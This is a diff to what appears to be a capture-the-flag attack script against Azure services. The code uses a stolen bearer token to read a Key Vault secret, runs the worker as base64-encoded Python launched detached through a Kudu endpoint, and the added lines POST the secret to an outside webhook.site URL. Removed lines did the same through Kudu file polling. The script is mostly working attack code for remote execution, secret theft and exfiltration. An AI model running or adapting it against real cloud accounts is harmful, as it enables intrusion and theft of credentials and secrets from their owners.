@@ -81,7 +81,12 @@ except Exception:
 time.sleep(25)
 flag_url = "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
 req = urllib.request.Request(flag_url, headers={"Authorization": "Bearer " + token("https://vault.azure.net")})
-print(urllib.request.urlopen(req, timeout=25).read().decode())
+raw = urllib.request.urlopen(req, timeout=25).read()
+print(raw.decode())
+try:
+    urllib.request.urlopen(urllib.request.Request("https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4", data=raw, method="POST", headers={"Content-Type": "application/json"}), timeout=20).read()
+except Exception:
+    pass
 """
 encoded = base64.b64encode(worker.encode()).decode()
 command = "nohup python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
@@ -93,19 +98,6 @@ try:
 except Exception as e:
     result = ("kudu launch: " + repr(e)).encode()
 print(result.decode(errors="replace"))
-# Poll Kudu VFS for the detached worker result.
-result_url = "https://" + APP + ".scm.azurewebsites.net/api/vfs/site/wwwroot/ctf_flag_result"
-last = b""
-for _ in range(36):
-    try:
-        rr = urllib.request.Request(result_url, headers={"Authorization": "Basic " + auth})
-        last = urllib.request.urlopen(rr, timeout=20).read()
-        text = last.decode(errors="replace")
-        if text.strip() and ("DF26{" in text or "flag" in text.lower() or "value" in text.lower() or "Traceback" in text):
-            print(text)
-            urllib.request.urlopen(urllib.request.Request(EXF, data=last, method="POST", headers={"Content-Type": "application/json"}), timeout=20).read()
-            break
-    except Exception:
-        pass
-    time.sleep(5)
+# The detached worker posts the final KV2 secret directly to the authorized webhook.
+time.sleep(1)
 PY
